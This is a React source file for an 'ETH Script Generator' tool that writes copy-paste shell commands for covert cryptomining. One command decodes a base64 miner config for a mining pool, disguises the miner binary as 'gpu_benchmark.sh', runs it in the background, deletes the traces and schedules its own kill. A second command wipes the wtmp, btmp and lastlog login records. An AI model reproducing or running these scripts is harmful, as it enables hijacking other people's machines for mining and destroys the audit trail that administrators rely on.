import React, {useState} from 'react';
import './App.css';
import '98.css';

const App = () => {
    const [minerFilepath, setMinerFilepath] = useState('/tmp/miner')
    const [fakeProcessName, setFakeProcessName] = useState('gpu_benchmark.sh')
    const [config, setConfig] = useState(
        '[common]\n' +
        'algo=ethash\n' +
        'pers=BgoldPoW\n' +
        'devices=0 1 2 3 4 5 6 7\n' +
        'templimit=90\n' +
        'watchdog=1\n' +
        'api=10555\n' +
        'pec=1\n' +
        '[server]\n' +
        'host=en.huobipool.com\n' +
        'port=443\n' +
        'user=esg9090'
    )
    const [configFilename, setConfigFilename] = useState('c')
    const [killAt, setKillAt] = useState('now + 10 hours')
    const [message, setMessage] = useState('')
    const [sudoFlag, setSudoFlag] = useState(true)

    const clipboard = navigator.clipboard

    const ethScript = ` echo ${btoa(config)} | base64 -d > ${configFilename} && cp ${minerFilepath} ${fakeProcessName} && sh -c 'nohup ./${fakeProcessName} --config ${configFilename} &' && sleep 10 && rm -rf nohup.out ${fakeProcessName} ${configFilename} && ps aux | grep '${fakeProcessName} --config ${configFilename}' | grep -v grep | awk '{print $2}' | xargs echo kill | at ${killAt}`

    const clearLoginHistoryScript = ` echo > /var/log/wtmp && echo > /var/log/btmp && echo > /var/log/lastlog`
    const clearLoginHistoryScriptWithSudo = ` sudo sh -c '${clearLoginHistoryScript}'`

    const handleCopyETHScriptBtnClick = () => {
        clipboard.writeText(ethScript).then(() => {
            setMessage('Copy ETH script successful')
        }).catch((e) => {
            console.error(e)
            setMessage('Failed to copy ETH script')
        }).finally(() => {
            setTimeout(() => {
                setMessage('')
            }, 3000)
        })
    }

    const handleCopyClearLoginHistoryScriptBtnClick = () => {
        const script = sudoFlag ? clearLoginHistoryScriptWithSudo : clearLoginHistoryScript
        clipboard.writeText(script).then(() => {
            setMessage('Copy clear login history script successful')
        }).catch((e) => {
            console.error(e)
            setMessage('Failed to copy clear login history script')
        }).finally(() => {
            setTimeout(() => {
                setMessage('')
            }, 3000)
        })
    }

    const handleSudoCheckboxChange = (e: { target: { checked: boolean } }) => {
        setSudoFlag(e.target.checked)
    }

    const handleSaveDataToLocalStorageBtnClick = () => {
        const data = {
            minerFilepath,
            fakeProcessName,
            config,
            configFilename,
            killAt,
        }
        localStorage.setItem('data', JSON.stringify(data))
        setMessage('Data saved successfully')
        setTimeout(() => {
            setMessage('')
        }, 3000)
    }

    const handleLoadDataFromLocalStorageBtnClick = () => {
        const dataStr = localStorage.getItem('data')
        if (dataStr == null) {
            setMessage('The data in localStorage is empty')
            setTimeout(() => {
                setMessage('')
            }, 3000)
            return
        }
        const data = JSON.parse(dataStr);
        setMinerFilepath(data.minerFilepath)
        setFakeProcessName(data.fakeProcessName)
        setConfig(data.config)
        setConfigFilename(data.configFilename)
        setKillAt(data.killAt)
        setMessage('Data loaded successfully')
        setTimeout(() => {
            setMessage('')
        }, 3000)
    }

    const handleResetBtnClick = () => {
        setMinerFilepath('')
        setFakeProcessName('')
        setConfig('')
        setConfigFilename('')
        setKillAt('')
        setMessage('')
    }

    return (
        <div
            className="window"
            style={{width: '700px'}}
        >
            <div className="title-bar">
                <div className="title-bar-text">
                    ETH Script Generator
                </div>
            </div>
            <div className="window-body">
                <div className="field-row-stacked">
                    <label>Miner filepath</label>
                    <input
                        type="text"
                        value={minerFilepath}
                        onChange={e => setMinerFilepath(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Fake process name</label>
                    <input
                        type="text"
                        value={fakeProcessName}
                        onChange={e => setFakeProcessName(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Config</label>
                    <textarea
                        rows={10}
                        value={config}
                        onChange={e => setConfig(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Config filename</label>
                    <input
                        type="text"
                        value={configFilename}
                        onChange={e => setConfigFilename(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Kill at</label>
                    <input
                        type="text"
                        value={killAt}
                        onChange={e => setKillAt(e.target.value)}
                    />
                </div>
                <div className="field-row-stacked">
                    <label>Rest & Save & Load</label>
                </div>
                <div className="field-row">
                    <button onClick={handleResetBtnClick}>Reset</button>
                    <button onClick={handleSaveDataToLocalStorageBtnClick}>Save data to local storage</button>
                    <button onClick={handleLoadDataFromLocalStorageBtnClick}>Load data from local storage</button>
                </div>
                <div className="field-row-stacked">
                    <label>ETH script</label>
                    <textarea
                        rows={8}
                        disabled
                        value={ethScript}
                    />
                    <button onClick={handleCopyETHScriptBtnClick}>Copy ETH script</button>
                </div>
                <div className="field-row">
                    <label>Clear login history script</label>
                    <span> </span>
                    <input
                        type="checkbox"
                        id="sudo"
                        checked={sudoFlag}
                        onChange={handleSudoCheckboxChange}
                    />
                    <label htmlFor="sudo">sudo</label>
                </div>
                <div className="field-row-stacked">
                    <textarea
                        disabled
                        value={sudoFlag ? clearLoginHistoryScriptWithSudo : clearLoginHistoryScript}
                    />
                    <button onClick={handleCopyClearLoginHistoryScriptBtnClick}>Copy clear login history script</button>
                </div>
                <div>
                    <p>{message}</p>
                </div>
            </div>
        </div>
    );
}

export default App;
